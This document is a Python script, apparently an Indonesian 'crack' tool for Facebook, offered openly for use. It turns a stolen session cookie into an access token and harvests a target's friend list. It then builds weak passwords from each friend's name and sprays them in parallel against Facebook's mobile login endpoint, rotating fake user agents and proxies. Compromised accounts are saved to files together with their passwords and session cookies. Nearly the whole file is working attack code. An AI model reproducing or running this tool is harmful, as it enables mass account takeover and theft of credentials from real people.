# Sc Free Not Prem
# Open Source 
# Sc Recode By RFN
# Jangan Lupa Follow Fb Saya Rifan - Code
# Follow Github Me:github.com/Rfnn23
# Update 20-July-2023
#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#------------------[ USER-AGENT-DEFAULT ]-------------------#
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)
###----------[ USER AGENT ]----------###
for t in range(10000):
	rr = random.randint
	rc = random.choice
	a=rc(['1','2','3','4','5','6','7','8','9','10','11','12'])
	b=rc(['0','1','2','3','4','5','6','7','8','9','10','11','12'])
	c=rc(['1','2','3','4','5','6','7','8','9','10','11','12'])
	realme = rc(["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"])
	build=rc(['QP1A','SKQ1','TP1A','RKQ1','SP1A','RP1A'])
	tipe=rc(['1','2','3','4','5','6','7','8','9'])
	rfn1=f'Mozilla/5.0 (Linux; U; Android {a}.{b}.{c}; {realme} Build/{build}.{str(rr(120000,250000))}.00{tipe}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(1500,5900))}.{str(rr(75,150))} Mobile Safari/537.36 swan-mibrowser'
	rfn2=f'Mozilla/5.0 (Linux; Android {a}.{b}.{c}; {realme}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(1500,5900))}.{str(rr(75,150))} Mobile Safari/537.36 swan-mibrowser'
	uaku2 = rc([rfn1,rfn2])
	ugen.append(uaku2)
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,tokenku,uid= [],[],0,0,0,[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def typo_z(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-BANNER ]-----------------#
def banner():
	clear()
	typo_z(f"{P}*--> Sc Free Jangan Di Prem'in Master\n*--> Pakai Sewajarnya Aja Master\n*--> Salam Alok Awakening{N}\n*--> Recode By {H}RFN{N}")
#--------------------[ BAGIAN-MASUK ]--------------#
ses = requests.Session()
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
ses = requests.Session()
def login_lagi334():
	os.system('clear') 
	banner()
	cok = input(f'[{M}>{N}] Masukkan cookie : ')
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		#exit(link.text)
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:print(f'> {m}cookie kamu invalid / ganti cookie lain !!!');time.sleep(2);masuk();batas()
		else:
			for x in find:
				jnck = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
				took = re.search('(EAAB\w+)', jnck.text).group(1)
				open('.token.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
				typo_z(f'[{M}>{N}] Token : {H}{took}{N}')
				typo_z(f'[{M}>{N}] Login Successfull')
				exit()
	except Exception as e:
		print(e)
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Expired Cookies ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	print('')
	ip = requests.get("https://api.ipify.org").text
	typo_z(f'[{H}>{N}] Your Idz : {my_id}\n[{H}>{N}] Your Ip : {ip}')
	print('')
	typo_z(f'{P}1. Crack Public\n2. Cek Hasil\n0. Exit{N}')
	_____rfn__xd_____ = input('[?] Select : ')
	print('')
	if _____rfn__xd_____ in ['1']:
		idt = input(f'[{H}>{N}] Masukan Idz Target : ')
		dump(idt,"",{"cookie":cok},token)
		setting()
	if _____rfn__xd_____ in ['2']:
		result()
	elif _____rfn__xd_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cok.txt')
		typo_z(f'[√] Success {M}Logout{N}')
		exit()
	else:
		print('>> input correctly ')
		back()
def error():
	print(f'{k}>> Sorry, this feature is still being fixed {x}')
	time.sleep(4)
	back()
#------------------[ BAGIAN-CEK HASIL ]----------------#
def result():
	typo_z(f'1. Hasil {H}OK{N} Kamu\n2. Hasil {K}CP{N} Kamu\n3. Kembali')
	kz = input(f'[?] Select : ')
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(' Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'(%s) %s {k}%s{x} akun'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'(%s) %s {k}%s{x} akun'%(cih,isi,(len(hem))))
			geeh = input(f'\n(?) Pilih  : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' Pilih Yang Bener  ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}{k}*---> {cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[!] Click enter ')
			back()
	elif kz in ['1','01']: 
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(' File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[%s] %s {h}%s{x} akun'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'[%s] %s {h}%s{x} akun'%(cih,isi,(len(hem))))
			geeh = input(f'\n(?) Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' Pilih Yang Bener  ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}{H}*---> {cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}{x}')
				nocp +=1
			print('')
			input(f'[!] Click enter ')
			back()
	elif kz in ['3','03']:
		back()
	else:
		print('Pilih Yang Bener ')
		exit()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			#print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r[{H}>{N}] sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print('')
	typo_z(f'{P}1. Id Old To New{N}\n{P}2. Id New To Old {N}({H}Recommended{N})\n{P}3. Id Random{N}')
	hu = input('[?] Select : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> input correctly ')
		exit()
		
	print('')
	typo_z(f'{P}1. Method Mobile{N}')
	hc = input('[?] Select : ')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	print('')
	pwplus=input('[?] Password Manual ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input('[>] Enter Password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print('')
	typo_z(f'[{H}>{N}] {H}OK{N} SAVE IN {H}OK/{okc}{N}\n[{K}>{N}] {K}CP{N} SAVE IN {K}CP/{cpc}{N}\n[{M}>{N}] Mainkan Mode {H}✈{N} Setiap 500 ID')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'321')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'321')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
	print('')
	typo_z(f'{P}[>] Crack Telah Selesai Jangan Lupa Amankan Hasil Cracknya{N}')
	typo_z(f'[{h}>{x}] {h}OK{x} : {h}%s{x} '%(ok))
	typo_z(f'[{k}>{x}] {k}CP{x} : {k}%s{x} '%(cp))
	typo_z(f'{P}[>] Good Bye Thanks To Using My Script{N}')
	time.sleep(2)
	back()
#--------------------[ METODE-MOBILE ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	rr = random.randint
	rc = random.choice
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	print(f'\r%s%s/%s OK : %s CP : %s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=2015912755309322&kid_directed_site=0&app_id=2015912755309322&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fclient_id%3D2015912755309322%26redirect_uri%3Dhttps%253A%252F%252Faccount.e.jimdo.com%252Fen%252Fsocial%252Ffacebook%252Fcallback%26scope%3Demail%252Cpublic_profile%252Cpages_show_list%26response_type%3Dcode%26state%3DXVpXfCOFMUzN%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Debcd66f7-ebfd-4372-92d2-69eae6c4e0c0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccount.e.jimdo.com%2Fen%2Fsocial%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DXVpXfCOFMUzN%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr') 
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
'email': idf,
'prefill_contact_point': idf,
'prefill_source': 'provided_or_soft_matched',
'prefill_type': 'contact_point',
'first_prefill_source': 'header',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true',
'had_password_prefilled': 'false',
'is_smart_lock': 'false',
'bi_xrwh': '0',
'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
'fb_dtsg': '',
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'__dyn': '',
'__csr': '',
'__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']), 
'__a': '',
'__user':0
}
			headers = {
'authority': 'mobile.facebook.com',
'accept': '*/*',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
'content-type': 'application/x-www-form-urlencoded',
'origin': 'https://m.facebook.com',
'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=2015912755309322&kid_directed_site=0&app_id=2015912755309322&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fclient_id%3D2015912755309322%26redirect_uri%3Dhttps%253A%252F%252Faccount.e.jimdo.com%252Fen%252Fsocial%252Ffacebook%252Fcallback%26scope%3Demail%252Cpublic_profile%252Cpages_show_list%26response_type%3Dcode%26state%3DXVpXfCOFMUzN%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Debcd66f7-ebfd-4372-92d2-69eae6c4e0c0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccount.e.jimdo.com%2Fen%2Fsocial%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DXVpXfCOFMUzN%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
'sec-ch-ua': f'"Not_A Brand";v="{str(rr(8,24))}", "Chromium";v="{str(rr(100,120))}"',
'sec-ch-ua-mobile': '?1',
'sec-ch-ua-platform': '"Android"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-site',
'user-agent': ua,
'viewport-width': '360',
'x-asbd-id': '129477',
'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
}
			params = {
'api_key': '2015912755309322',
'auth_token': 'def900ec4ec1e801698568fe3194fb4d',
'skip_api_login': '1',
'signed_next': '1',
'next': 'https://m.facebook.com/v15.0/dialog/oauth?client_id=2015912755309322&redirect_uri=https%3A%2F%2Faccount.e.jimdo.com%2Fen%2Fsocial%2Ffacebook%2Fcallback&scope=email%2Cpublic_profile%2Cpages_show_list&response_type=code&state=XVpXfCOFMUzN&ret=login&fbapp_pres=0&logger_id=ebcd66f7-ebfd-4372-92d2-69eae6c4e0c0&tp=unspecified',
'refsrc': 'deprecated',
'app_id': '2015912755309322',
'cancel': 'https://account.e.jimdo.com/en/social/facebook/callback?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=XVpXfCOFMUzN#_=_',
'lwv': '101',
}
			po = ses.post('https://mobile.facebook.com/login/device-based/login/async/',params=params,headers=headers,data=data,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r├── {K}{idf}{P} \n│   └── {K}{pw}{P}\n└── {K}{ua}{P} ')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r├── {H}{idf}{P} \n│   └── {H}{pw}{P}\n└── {H}{kuki}{P}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()

#>>>>> THANKS TO THIS HERE <<<<<<<#
#>>>>> RFN <<<<<#